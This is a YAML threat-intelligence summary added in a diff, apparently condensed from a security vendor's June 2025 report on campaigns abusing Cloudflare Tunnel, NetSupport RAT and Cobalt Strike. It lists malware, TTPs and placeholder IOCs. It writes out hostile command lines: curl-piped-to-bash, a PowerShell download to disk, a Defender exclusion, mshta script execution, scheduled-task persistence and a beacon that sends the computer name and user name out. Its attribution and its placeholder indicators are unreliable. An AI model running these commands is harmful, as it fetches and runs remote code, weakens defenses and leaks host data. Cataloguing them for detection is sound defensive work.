@@ -1,0 +1,127 @@
+description: Serpentine#Cloud campaign abuses Cloudflare Tunnel infrastructure to
+  deliver Python-based malware via malicious .lnk shortcuts. GrayAlpha employs fake
+  updates and spoofed downloads for NetSupport RAT deployment, while Cobalt Strike
+  operators use open directories on Baidu Cloud for PowerShell script delivery.
+attribution:
+  threat_actor: APT36, TA397, Transparent Tribe, TAG-140, Silver Fox, Confucius group
+  country: China, Russia, Singapore
+malware_families:
+- AMOS Stealer
+- AsyncRAT
+- DRAT V2
+- BitterRAT
+- DISGOMOJI
+- ValleyRAT
+- Anondoor
+- ValleyRAT (Winos 4.0)
+- PowerNet
+- MaskBat
+- NetSupport RAT
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - conhost.exe
+  - curl
+  - schtasks
+  - systeminfo
+  - tasklist
+  - wmic
+  - mshta.exe
+  - svchost.exe
+  - vssadmin
+  - vim-cmd
+  - VBScript
+  - batch
+  - Python
+  - PowerShell
+  commandline:
+  - schtasks /create /tn "SystemCheck" /tr "C:\\Path\\to\\MediaViewerLauncher.exe"
+  - powershell.exe -ExecutionPolicy Bypass -Command "& {Add-MpPreference -ExclusionPath
+    C:\\SuspiciousFolder}"
+  - curl -fsSL <URL> | bash
+  powershell:
+  - '& {Add-MpPreference -ExclusionPath "C:\\SuspiciousFolder"}'
+  - '& {Invoke-WebRequest -Uri "<URL>" -OutFile "C:\\Temp\\downloaded_file.exe"}'
+  scripting_engine:
+  - mshta.exe "vbscript:CreateObject("WScript.Shell").Run ""cmd /c start run:"",0,
+    false"
+  - VBScript
+  - Batch
+  - Python
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load:
+  - svchost.exe loading malicious DLL
+  network_connections:
+  - executable: curl
+    destination_address: jbc.php
+    url_parameters: /jbc.php?fv=COMPUTERNAME*USERNAME
+  - executable: PowerShell
+    destination_address: custom C2 IPs
+    port: 4444
+  - destination_address: Cloudflare domains
+    URL: ''
+    hostname: ''
+    ports: []
+  file_activity:
+  - C:\\Users\\Public\\suspicious_file.exe created
+  - C:\\Temp\\downloaded_file.exe accessed
+  persistence:
+    methods:
+    - scheduled_tasks: schtasks /create /tn "SystemCheck" /tr "C:\\Path\\to\\MediaViewerLauncher.exe"
+    - registry_modifications: HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+    - startup_folders: C:\\Users\\Public\\suspicious_file.exe
+  pipes:
+  - \\\\.\\pipe\\SuspiciousPipe
+  process_relations:
+  - cmd.exe -> powershell.exe -> conhost.exe
+TTPs_related_to_TA397:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - conhost.exe
+  - curl
+  commandline:
+  - curl -fsSL <URL> | bash
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+TTPs_related_to_TAG-140:
+  processes:
+  - mshta.exe
+  commandline:
+  - mshta.exe "vbscript:CreateObject("WScript.Shell").Run ""cmd /c start run:"",0,
+    false"
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+TTPs_related_to_APT36:
+  processes:
+  - svchost.exe
+  commandline:
+  - powershell.exe -ExecutionPolicy Bypass -Command "& {Invoke-WebRequest -Uri "<URL>"
+    -OutFile "C:\\Temp\\downloaded_file.exe"}"
+  registry_keys:
+  - HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+TTPs_related_to_APT-C-56:
+  processes:
+  - bash
+  commandline:
+  - java -jar $HOME/.config/x96-dependencies.jar
+IOCs:
+  hashes:
+  - SHA256:examplehash1
+  - SHA256:examplehash2
+  IPs:
+  - 192.168.1.1
+  domains:
+  - suspiciousdomain.com
+  URLs:
+  - http://jbc.php?fv=COMPUTERNAME*USERNAME
+authors:
+- Dheeraj Kumar
+- Sina Chehreghani
+- Nitish Singh
+- Nikhil Kumar Chada
+reference: https://www.securonix.com/blog/securonix-threat-labs-monthly-intelligence-insights-june-2025/
+date_of_publication: July 14, 2025
+file_creation_date: July 14, 2025
